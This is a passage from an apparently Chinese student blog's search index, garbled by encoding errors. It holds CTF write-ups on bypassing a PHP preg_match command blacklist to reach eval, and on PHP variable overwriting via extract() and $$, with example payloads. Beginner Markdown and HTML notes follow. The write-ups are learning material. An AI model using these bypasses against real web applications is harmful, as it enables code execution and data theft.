å®¡è®¡ï¼š   </p><pre><code> &lt;?php                 //flag in flag                 error_ reporting(0);               show_source(__FILE__);                    if (isset($_GET[&#39;Rem&#39;]))&#123;       ////isset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚          $Ram=$_GET[&#39;Rem&#39;];      ////å°†GETåˆ°çš„Remèµ‹ç»™Ram            if(preg_match(&quot;/(more|less|flag|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i&quot;, $Ram))&#123;         die(&quot;&lt;strong&gt;&lt;center&gt;æ€»ä¹‹å°±æ˜¯éå¸¸å¯çˆ±&lt;/center&gt;&lt;/strong&gt;&quot;);                            &#125;                               ////GETåˆ°çš„Remå˜é‡ä¸èƒ½åŒ…å«ä¸Šé¢çš„è¯ï¼Œç¬¦å·,å¦åˆ™ä¼šè¾“å‡ºâ€œæ€»ä¹‹å°±æ˜¯éå¸¸å¯çˆ±â€ï¼Œè€Œä¸ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç      $a = eval($Ram);               &#125;else&#123;                 echo &quot;&lt;script&gt;alert(&#39;çˆ¬çˆ¬çˆ¬æˆ‘æœ€ä¼šçˆ¬äº†&#39;)&lt;/script&gt;&quot;;            &#125;</code></pre></li></ul><p>é¦–å…ˆæ•´æ®µä»£ç æ²¡æœ‰è¾“å‡ºflagçš„è¯­å¥ï¼Œä¹Ÿæ²¡æœ‰åŒ…å«flagçš„æ–‡ä»¶åï¼Œå’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œåªä¸è¿‡è¿™ä¸€é¢˜è¦æ¶‰åŠåˆ°preg_match()å‡½æ•°çš„ç»•è¿‡ï¼Œè¿˜æ˜¯å…ˆsysytem(â€˜lsâ€™);æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶åï¼š<br><img src="https://ftp.bmp.ovh/imgs/2020/11/7b1689d1b2425481.png"><br>preg_match()å‡½æ•°ç”¨å–åç»•è¿‡ï¼Œå°†å‘½ä»¤å–åurlç¼–ç ï¼š<img src="https://ftp.bmp.ovh/imgs/2020/11/a4396685470b825d.png"><br>è¾“å…¥å¾—åˆ°flagï¼š<br><img src="https://ftp.bmp.ovh/imgs/2020/11/69ce879a72e63742.png">  </p><hr><h2 id="çŸ¥è¯†ç‚¹æ€»ç»“-1"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“-1" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h2><ul><li>isset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚</li><li>PHP ä¸­çš„ preg_match() å‡½æ•°å¯ä»¥æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼å¯¹å­—ç¬¦ä¸²è¿›è¡Œæœç´¢åŒ¹é…ã€‚é¢˜ä¸­çš„ <strong>|</strong> æ„æ€æ˜¯ <strong>æˆ–</strong> ï¼›æœ«å°¾çš„ <strong>i</strong> æ„æ€æ˜¯ <strong>ä¸åŒºåˆ†å¤§å°å†™</strong></li><li>è¿™é“é¢˜ç”¨çš„æ˜¯preg_matchçš„å–åç»•è¿‡ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–ç»•è¿‡æ–¹å¼ï¼Œé™„ä¸Šåšå®¢å›­ä¸€ä½å¤§ä½¬å†™çš„æ€»ç»“<br><a href="https://www.cnblogs.com/v01cano/p/11736722.html">https://www.cnblogs.com/v01cano/p/11736722.html</a>      </li><li><code>&lt;script&gt;&lt;/script&gt;</code>æ˜¯HTMLçš„ä¸€å¯¹æ ‡ç­¾,ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MarkDownåŸºæœ¬ä½¿ç”¨</title>
    <link href="/2020/11/26/MarkDown/"/>
    <url>/2020/11/26/MarkDown/</url>
    
    <content type="html"><![CDATA[<h2 id="Markdownæ ‡é¢˜"><a href="#Markdownæ ‡é¢˜" class="headerlink" title="Markdownæ ‡é¢˜"></a>Markdownæ ‡é¢˜</h2><p>ä¸¤ç§æ ¼å¼ï¼š<br>1ã€ä½¿ç”¨=å’Œ-æ ‡è®°ä¸€äºŒçº§æ ‡é¢˜<br>ä¸€çº§æ ‡é¢˜<br>=============<br>äºŒçº§æ ‡é¢˜   </p><hr><p>2ã€ä½¿ç”¨#å·ï¼Œè¡¨ç¤º1~6çº§æ ‡é¢˜       </p><h1 id="ä¸€çº§æ ‡é¢˜"><a href="#ä¸€çº§æ ‡é¢˜" class="headerlink" title="ä¸€çº§æ ‡é¢˜"></a>ä¸€çº§æ ‡é¢˜</h1><h2 id="äºŒçº§æ ‡é¢˜"><a href="#äºŒçº§æ ‡é¢˜" class="headerlink" title="äºŒçº§æ ‡é¢˜"></a>äºŒçº§æ ‡é¢˜</h2><p>â€¦â€¦â€¦â€¦    </p><h6 id="å…­çº§æ ‡é¢˜"><a href="#å…­çº§æ ‡é¢˜" class="headerlink" title="å…­çº§æ ‡é¢˜"></a>å…­çº§æ ‡é¢˜</h6><hr><h2 id="Markdownæ®µè½"><a href="#Markdownæ®µè½" class="headerlink" title="Markdownæ®µè½"></a>Markdownæ®µè½</h2><p>æ¢è¡Œï¼šä¸¤ä¸ªä»¥ä¸Šç©ºæ ¼åŠ ä¸Šå›è½¦  æˆ–è€… ä½¿ç”¨ç©ºè¡Œæ¥æ¢è¡Œ    </p><hr><h2 id="Markdownå­—ä½“"><a href="#Markdownå­—ä½“" class="headerlink" title="Markdownå­—ä½“"></a>Markdownå­—ä½“</h2><p>1ã€å°†æ–‡æœ¬æ’å…¥åˆ°ä¸¤ä¸ªæ˜Ÿå·ï¼ˆ**ï¼‰æˆ–ä¸¤ä¸ªä¸‹åˆ’çº¿ï¼ˆ__ï¼‰è¡¨ç¤ºæ–œä½“å­—ã€‚<br>2ã€å°†æ–‡æœ¬æ’å…¥åˆ°å››ä¸ªæ˜Ÿå·ä¸­é—´æˆ–è€…å››ä¸ªä¸‹åˆ’çº¿ä¸­é—´è¡¨ç¤ºç²—ä½“å­—ã€‚<br>3ã€å°†æ–‡æœ¬æ’å…¥åˆ°å…­ä¸ªæ˜Ÿå·æˆ–ä¸‹åˆ’çº¿ä¸­é—´è¡¨ç¤ºç²—æ–œä½“å­—ã€‚   </p><hr><h2 id="Markdownåˆ†éš”çº¿"><a href="#Markdownåˆ†éš”çº¿" class="headerlink" title="Markdownåˆ†éš”çº¿"></a>Markdownåˆ†éš”çº¿</h2><p>ä¸€è¡Œæ˜Ÿå·***æˆ–â€”â€”-    </p><hr><h2 id="Markdownåˆ é™¤çº¿"><a href="#Markdownåˆ é™¤çº¿" class="headerlink" title="Markdownåˆ é™¤çº¿"></a>Markdownåˆ é™¤çº¿</h2><p>åœ¨å°†è¦åˆ é™¤çš„æ–‡å­—ä¸¤ç«¯åŠ ä¸Šä¸¤ä¸ªæ³¢æµªçº¿,â€¦â€¦â€¦â€¦ä¼¼ä¹ä¸è¡Œå•Šï¼Œä½†æ˜¯å¯ä»¥ç”¨HTMLæ ‡ç­¾<code>&lt;del&gt;&lt;/del&gt;</code><br><del>llll-nnnnn</del>    </p><hr><h2 id="Markdownä¸‹åˆ’çº¿"><a href="#Markdownä¸‹åˆ’çº¿" class="headerlink" title="Markdownä¸‹åˆ’çº¿"></a>Markdownä¸‹åˆ’çº¿</h2><p>é€šè¿‡HTMLæ ‡ç­¾<code>&lt;u&gt;&lt;/u&gt;</code><br><u>llll-nnnn</u>   </p><hr><h2 id="Markdownè„šæ³¨"><a href="#Markdownè„šæ³¨" class="headerlink" title="Markdownè„šæ³¨"></a>Markdownè„šæ³¨</h2><p>æ ¼å¼ï¼š<code>[^æ³¨æ˜æ–‡æœ¬]</code><br>[^lll-nnn]<br>[^lll-nnn]: myself</p><hr><h2 id="Markdownåˆ—è¡¨"><a href="#Markdownåˆ—è¡¨" class="headerlink" title="Markdownåˆ—è¡¨"></a>Markdownåˆ—è¡¨</h2><p>æ˜Ÿå·ï¼ˆ*ï¼‰ã€åŠ å·ï¼ˆ+ï¼‰ã€å‡å·ï¼ˆ-ï¼‰ä½œä¸ºåˆ—è¡¨æ ‡è®°ï¼Œæ ‡è®°åé¢åŠ ä¸€ä¸ªç©ºæ ¼å†å¡«å†™å†…å®¹ã€‚     </p><ul><li><p>1</p></li><li><p>2</p></li></ul><ul><li>3   <h3 id="åˆ—è¡¨åµŒå¥—"><a href="#åˆ—è¡¨åµŒå¥—" class="headerlink" title="åˆ—è¡¨åµŒå¥—"></a>åˆ—è¡¨åµŒå¥—</h3>åœ¨å­åˆ—è¡¨å‰é¢åŠ å››ä¸ªç©ºæ ¼ã€‚   </li></ul><ul><li>ç¬¬ä¸€é¡¹ <ul><li>ç¬¬ä¸€é¡¹åµŒå¥—çš„ç¬¬ä¸€ä¸ªå…ƒç´ </li><li>ç¬¬ä¸€é¡¹åµŒå¥—çš„ç¬¬äºŒä¸ªå…ƒç´      <h4 id="åˆ—è¡¨ä¸­ä½¿ç”¨åŒºå—"><a href="#åˆ—è¡¨ä¸­ä½¿ç”¨åŒºå—" class="headerlink" title="åˆ—è¡¨ä¸­ä½¿ç”¨åŒºå—"></a>åˆ—è¡¨ä¸­ä½¿ç”¨åŒºå—</h4></li></ul></li><li>123   <blockquote><p>123<br>456     </p></blockquote></li></ul><hr><h2 id="MarkdownåŒºå—"><a href="#MarkdownåŒºå—" class="headerlink" title="MarkdownåŒºå—"></a>MarkdownåŒºå—</h2><p>ä½¿ç”¨<code>&gt;</code>ç¬¦å·ï¼Œåé¢ä¸€ä¸ªç©ºæ ¼ã€‚    </p><blockquote><p>åŒºå—1<br>åŒºå—2<br>åŒºå—3     </p></blockquote><h3 id="åŒºå—åµŒå¥—"><a href="#åŒºå—åµŒå¥—" class="headerlink" title="åŒºå—åµŒå¥—"></a>åŒºå—åµŒå¥—</h3><blockquote><p>ç¬¬ä¸€å±‚    </p><blockquote><p>ç¬¬äºŒå±‚    </p><blockquote><p>ç¬¬ä¸‰å±‚     </p></blockquote></blockquote></blockquote><h4 id="åŒºå—ä¸­ä½¿ç”¨åˆ—è¡¨"><a href="#åŒºå—ä¸­ä½¿ç”¨åˆ—è¡¨" class="headerlink" title="åŒºå—ä¸­ä½¿ç”¨åˆ—è¡¨"></a>åŒºå—ä¸­ä½¿ç”¨åˆ—è¡¨</h4><p>åŒºå—ç¬¦å·åé¢åŠ ä¸Šåˆ—è¡¨ç¬¦å·å³å¯ã€‚</p><blockquote><p>åŒºå—ä¸­çš„åˆ—è¡¨       </p><ul><li> ç¬¬ä¸€é¡¹    </li><li> ç¬¬äºŒé¡¹</li></ul></blockquote><hr><h2 id="Markdownä»£ç "><a href="#Markdownä»£ç " class="headerlink" title="Markdownä»£ç "></a>Markdownä»£ç </h2><p>å¥å­ä¸­æ’å…¥ä»£ç ï¼Œå°†ä»£ç ç”¨åå¼•å·ï¼ˆ`ï¼‰åŒ…èµ·æ¥ã€‚<br>æ•´æ®µä»£ç ï¼Œä¹Ÿå¯ä½¿ç”¨å››ä¸ªç©ºæ ¼æˆ–è€…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼ˆTabï¼‰ã€‚    </p><hr><h2 id="Markdowné“¾æ¥"><a href="#Markdowné“¾æ¥" class="headerlink" title="Markdowné“¾æ¥"></a>Markdowné“¾æ¥</h2><p><code>[é“¾æ¥åç§°](é“¾æ¥åœ°å€)</code><br>æˆ–è€…<br><code>&lt;é“¾æ¥åœ°å€&gt;</code><br><a href="https://lll-nnn.github.io/">lll-nnn</a><br>ä¹Ÿå¯ä»¥ä½¿ç”¨å˜é‡èµ‹å€¼çš„æ–¹æ³• é“¾æ¥        </p><p><code>         è¿™æ˜¯æˆ‘çš„åšå®¢[lll-nnn][1]ã€‚               [1]: https://lll-nnn.github.io/</code>  </p><hr><h2 id="Markdownæ’å…¥å›¾ç‰‡"><a href="#Markdownæ’å…¥å›¾ç‰‡" class="headerlink" title="Markdownæ’å…¥å›¾ç‰‡"></a>Markdownæ’å…¥å›¾ç‰‡</h2><p>æ ¼å¼ï¼š <code>![alt å±æ€§æ–‡æœ¬](å›¾ç‰‡åœ°å€ &quot;å¯é€‰æ ‡é¢˜&quot;)</code><br>æˆ–è€… åƒè¶…é“¾æ¥é‚£æ ·ä½¿ç”¨å˜é‡ã€‚<br>å¯ä»¥ä½¿ç”¨<code>&lt;img src=&quot;url&quot; width=&quot;300&quot; heigth=&quot;300&quot;</code>è®¾å®šå®½åº¦å’Œé«˜åº¦<br>é™„ï¼šè·å¾—æœ¬åœ°ç…§ç‰‡ç½‘ç»œåœ°å€ï¼ˆurlï¼‰çš„æ–¹æ³•ï¼š     </p><ol><li>é€šè¿‡ç™¾åº¦è¯†å›¾ä¸Šä¼ ç„¶åå³é”®ä¸Šä¼ çš„å›¾ç‰‡æŸ¥çœ‹åœ°å€ã€‚    </li><li>æœ€å¥½åˆ›å»ºä¸€ä¸ªå›¾åºŠã€‚å›¾åºŠåˆ›å»ºæ–¹å¼ï¼š<a href="https://www.jianshu.com/p/d51258ef5484">https://www.jianshu.com/p/d51258ef5484</a>  </li><li>xxxx.md å¼•å…¥å›¾ç‰‡æ—¶ï¼Œå…ˆæŠŠå›¾ç‰‡å¤åˆ¶åˆ°xxxxæ–‡ä»¶å¤¹ä¸­ ç„¶ååœ¨xxxx.mdä¸­æŒ‰ç…§markdownçš„æ ¼å¼å¼•å…¥å›¾ç‰‡ï¼š<br><code>![ä½ æƒ³è¾“å…¥çš„æ›¿ä»£æ–‡å­—](xxxx/å›¾ç‰‡å.jpg)</code></li></ol><p><code>![é¬¼åˆ€](http://m.qpic.cn/psc?/V12Z3Zad2KK0gc/45NBuzDIW489QBoVep5mcZqHcWkXe5o2wOT*Z7lw4p5ynCBBo4qwUhcEBh9*mzSxtF4uyLYKqlixt3qQ11yt9FuqEyqhMI0.2Bu7NyxK6UU!/b&amp;bo=IAMIAiADCAIBFzA!&amp;rf=viewer_4)</code><br><img src="https://ftp.bmp.ovh/imgs/2020/11/1498818c58bca487.jpg"></p><hr><h2 id="Markdownè¡¨æ ¼"><a href="#Markdownè¡¨æ ¼" class="headerlink" title="Markdownè¡¨æ ¼"></a>Markdownè¡¨æ ¼</h2><p>ä½¿ç”¨<code>|</code>æ¥åˆ†éš”ä¸åŒçš„å•å…ƒæ ¼ï¼Œä½¿ç”¨<code>-</code>æ¥åˆ†éš”è¡¨å¤´å’Œå…¶ä»–è¡Œã€‚<br> |è¡¨å¤´ | è¡¨å¤´|<br>|  -  | - |<br>| å•å…ƒæ ¼  | å•å…ƒæ ¼ |<br>| å•å…ƒæ ¼  | å•å…ƒæ ¼ |<br>è¡¨æ ¼ä¼¼ä¹ä¸èƒ½ç”¨å•Šï¼Ÿï¼Ÿï¼Ÿ<br>ç­‰æ‰¾åˆ°è§£å†³åŠæ³•å†å†™å§ã€‚ã€‚ã€‚    </p><hr><p>å¦å¤–è¿˜æœ‰ä¸€äº›é«˜çº§æŠ€å·§ï¼Œæ„Ÿè§‰ä¹Ÿç”¨ä¸åˆ°ï¼Œç­‰ç”¨åˆ°æ—¶å†å†™å§ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>NOTE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NOTE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Phpå˜é‡è¦†ç›–</title>
    <link href="/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96WP/"/>
    <url>/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96WP/</url>
    
    <content type="html"><![CDATA[<h1 id="phpå˜é‡è¦†ç›–1"><a href="#phpå˜é‡è¦†ç›–1" class="headerlink" title="phpå˜é‡è¦†ç›–1"></a>phpå˜é‡è¦†ç›–1</h1><hr><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><pre><code>&lt;html&gt;&lt;head&gt;&lt;title&gt;php-extract&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;font color=&quot;red&quot;&gt;please use &lt;font color=&quot;blue&quot;&gt;`ctrl+u`&lt;/font&gt; to see the source code&lt;/font&gt;&lt;/p&gt;&lt;article&gt;$flag=&#39;xxxxxxxx&#39;;extract($_GET);           ////extract()å‡½æ•°å°†GETåˆ°çš„å­—ç¬¦ä½œä¸ºå˜é‡if(isset($liwu)) &#123;    $content=trim(file_get_contents($flag));          ////file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥$contentä¸­ã€‚trim()ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„å­—ç¬¦ã€‚    if($liwu==$content) &#123;        echo&#39;flag&#123;xxxxxxxxxxx&#125;&#39;;    &#125;    else &#123;        echo &#39;please try other operation.&#39;;    &#125;&#125;?&gt;&lt;/article&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>é¢˜ç›®çš„æ„æ€æ˜¯ä»¥GETæ–¹å¼è¾“å…¥liwuï¼Œç»è¿‡extractå‡½æ•°åå½“ä½œå˜é‡ï¼Œå°†å…¶ä¸$contentå¯¹æ¯”ï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™è¾“å‡ºflagã€‚<br>ä»¥GETæ–¹å¼è¾“å…¥ <strong>liwu&amp;flag=1</strong>è¿™æ ·å°±è¦†ç›–äº†ä¸€å¼€å§‹flagçš„å€¼ï¼Œ$liwuå’Œ$contentä¸¤ä¸ªå˜é‡ä¹Ÿä¼šç›¸ç­‰ï¼Œå°±èƒ½å¾—åˆ°flagäº†ã€‚<br><img src="https://ftp.bmp.ovh/imgs/2020/11/85d734f646fc46e9.png">   </p><hr><h2 id="çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h2><ul><li>è¿™é“é¢˜å±äºextract()å‡½æ•°å˜é‡è¦†ç›–ã€‚</li><li>extract()å‡½æ•°å°†GETåˆ°çš„å­—ç¬¦ä½œä¸ºå˜é‡ã€‚</li><li>file_get_contents()å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</li><li>trim()å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚<ul><li>è‡³äºæœ¬é¢˜ä¸ºä»€ä¹ˆè¦ç”¨è¿™ä¸ªå‡½æ•°ï¼Œå¯èƒ½æ˜¯å› ä¸ºæœ¬æ¥çš„flagå«æœ‰ç©ºæ ¼æˆ–å…¶ä»–å­—ç¬¦å§ã€‚   </li></ul></li></ul><hr><h1 id="phpå˜é‡è¦†ç›–2"><a href="#phpå˜é‡è¦†ç›–2" class="headerlink" title="phpå˜é‡è¦†ç›–2"></a>phpå˜é‡è¦†ç›–2</h1><hr><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>è¿˜æ˜¯å…ˆä»£ç å®¡è®¡ï¼š     </p><pre><code>&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;$_403 = &quot;æ‹’ç»è®¿é—®&quot;;$_200 = &quot;æ¬¢è¿~~~&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;sssssssspostâ€¦&quot;);     ////è¡¨æ˜è¾“å…¥è¯·æ±‚çš„æ–¹å¼åº”è¯¥ä¸ºPOSTif ( !isset($_POST[&quot;flag&quot;]) )    die($_403);        ////åˆ¤æ–­æ˜¯å¦é€šè¿‡POSTæäº¤äº†flagå˜é‡foreach ($_GET as $key =&gt; $value)      ////foreach()å°±æ˜¯forå¾ªç¯    $$key = $$value;  ////$_GETé”®åèµ‹ç»™$key,é”®å€¼èµ‹ç»™$value,ç»è¿‡$$key = $$valueåGETçš„å°±ä¼šå˜ä¸ºå˜é‡foreach ($_POST as $key =&gt; $value)    $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;die($_200);      ?&gt;                       </code></pre><p>æœ€åè¾“å‡ºçš„æ˜¯$_200 = â€œæ¬¢è¿~~~â€ï¼›è€Œflagæ²¡æœ‰è¾“å‡ºæ–¹å¼ï¼Œæ‰€ä»¥å°†$_200çš„å€¼å˜æˆflagå°±èƒ½å¾—åˆ°flagäº†ã€‚<br>GETä¼ å…¥_200=flag,ç»è¿‡forå¾ªç¯å°±ä¼šå˜æˆ$_200=$flag,è¿™æ ·å°±æŠŠflagç»™$_200äº†ï¼Œæœ€åå†POSTä¸ªflagçš„å€¼ï¼Œè®©å®ƒä¸ç­‰$flagå°±èƒ½è¾“å‡ºflagäº†ã€‚<br> <img src="https://ftp.bmp.ovh/imgs/2020/11/067bd0d3e477579e.png">       </p><hr><h2 id="çŸ¥è¯†ç‚¹æ€»ç»“-1"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“-1" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h2><ul><li>è¿™é“é¢˜å±äº**$$**å˜é‡è¦†ç›–é—®é¢˜ã€‚</li><li>ä¸»è¦æ˜¯forå¾ªç¯ä¸­ï¼š$_GETé”®åèµ‹ç»™$key,é”®å€¼èµ‹ç»™$value,ç»è¿‡$$key = $$valueåGETçš„å°±ä¼šå˜ä¸ºå˜é‡ã€‚å¼„æ‡‚è¿™ä¸ªï¼Œè¿™é“é¢˜å°±å‡ºæ¥äº†ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTMLåŸºç¡€å­¦ä¹ ç¬”è®°</title>
    <link href="/2020/11/24/html/"/>
    <url>/2020/11/24/html/</url>
    
    <content type="html"><![CDATA[<h2 id="HTMLåŸºç¡€"><a href="#HTMLåŸºç¡€" class="headerlink" title="HTMLåŸºç¡€"></a>HTMLåŸºç¡€</h2><h3 id="htmlæ ‡é¢˜"><a href="#htmlæ ‡é¢˜" class="headerlink" title="htmlæ ‡é¢˜"></a>htmlæ ‡é¢˜</h3><p>htmlæ ‡é¢˜é€šè¿‡<br><code>&lt;h1&gt;æœ€å¤§æ ‡é¢˜&lt;/h1&gt;</code><br><code>&lt;h2&gt;&lt;/h2&gt;</code><br>â€¦â€¦â€¦â€¦<br><code>&lt;h6&gt;æœ€å°æ ‡é¢˜&lt;/h6&gt;</code><br>è¿™äº›æ ‡ç­¾æ¥å®šä¹‰ã€‚   </p><h3 id="htmlæ®µè½"><a href="#htmlæ®µè½" class="headerlink" title="htmlæ®µè½"></a>htmlæ®µè½</h3><p>htmlæ®µè½é€šè¿‡æ ‡ç­¾<code>&lt;p&gt;ä¸€ä¸ªæ®µè½&lt;/p&gt;</code>å®šä¹‰ã€‚   </p><h3 id="htmlé“¾æ¥"><a href="#htmlé“¾æ¥" class="headerlink" title="htmlé“¾æ¥"></a>htmlé“¾æ¥</h3><p>htmlé“¾æ¥é€šè¿‡æ ‡ç­¾<code>&lt;a&gt;&lt;/a&gt;</code>å®šä¹‰ã€‚<br><code>&lt;a href=&quot;https://lll-nnn.github.io/&quot; target=&quot;_blank&quot;&gt;lll-nnnã®blog&lt;/a&gt;</code>   </p><h3 id="htmlå›¾åƒ"><a href="#htmlå›¾åƒ" class="headerlink" title="htmlå›¾åƒ"></a>htmlå›¾åƒ</h3><p>htmlå›¾åƒé€šè¿‡æ ‡ç­¾<code>&lt;img&gt;</code>å®šä¹‰ã€‚<br><code>&lt;img src=&quot;url&quot; &gt;</code></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;     body &#123;background-color:gainsboro&#125;&lt;/style&gt;&lt;base href=&quot;https://lll-nnn.github.io/&quot; target=&quot;_blank&quot;&gt;   &lt;!--target=&quot;_blank&quot;   åœ¨æ–°çª—å£æ‰“å¼€æ–‡æ¡£--&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt; HTML STUDY&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;ä¸€çº§æ ‡é¢˜&lt;/h1&gt;&lt;h2&gt;äºŒçº§æ ‡é¢˜&lt;/h2&gt;&lt;h6&gt;æœ€åä¸€çº§æ ‡é¢˜&lt;/h6&gt;&lt;p&gt;æ®µè½&lt;/p&gt;&lt;!--HTMLé“¾æ¥--&gt;&lt;a href=&quot;https://lll-nnn.github.io/&quot; target=&quot;_blank&quot; rel=&quot;myself&quot;&gt;lll-nnnã®blog&lt;/a&gt;     &lt;!--relç”¨äºæŒ‡å®šå½“å‰æ–‡æ¡£ä¸è¢«è¿æ¥æ–‡æ¡£çš„å…³ç³»--&gt;&lt;!--HTMLå›¾åƒ--&gt;&lt;img src=&quot;C:\Users\ASUS\OneDrive\æ¡Œé¢\paper\guidao.jpg&quot; ait=&quot;guidao&quot; width=&quot;800&quot; height=&quot;800&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2020/11/55f7b2cabe9b8915.png"></p>]]></content>
    
    
    <categories>
      
      <category>NOTE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NOTE</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>å…³äº</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>About</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>404</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Friends</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Tags</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ†ç±»</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Html</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>æ ‡ç­¾</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
